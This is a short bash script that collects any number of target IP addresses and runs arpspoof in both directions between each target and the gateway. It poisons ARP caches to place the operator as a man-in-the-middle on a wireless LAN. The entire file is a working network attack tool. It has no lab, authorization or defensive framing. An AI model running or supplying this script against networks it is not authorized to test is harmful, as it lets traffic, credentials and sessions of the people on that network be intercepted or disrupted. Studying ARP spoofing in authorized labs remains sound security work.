#!/bin/bash

# Define your network interface and gateway IP
INTERFACE="wlan0"
GATEWAY="192.168.0.1"

# Prompt user for the number of target IPs
read -p "Enter the number of target IP addresses: " NUM_TARGETS

# Initialize an empty array for targets
TARGETS=()

# Collect target IP addresses from the user
for ((i = 1; i <= NUM_TARGETS; i++)); do
    read -p "Enter target IP address #$i: " TARGET_IP
    TARGETS+=("$TARGET_IP")
done

# Start arpspoof for each target
for TARGET in "${TARGETS[@]}"
do
    echo "Spoofing target $TARGET..."
    sudo arpspoof -i $INTERFACE -t $TARGET $GATEWAY &
    sudo arpspoof -i $INTERFACE -t $GATEWAY $TARGET &
done

# Wait for all background processes to finish
wait
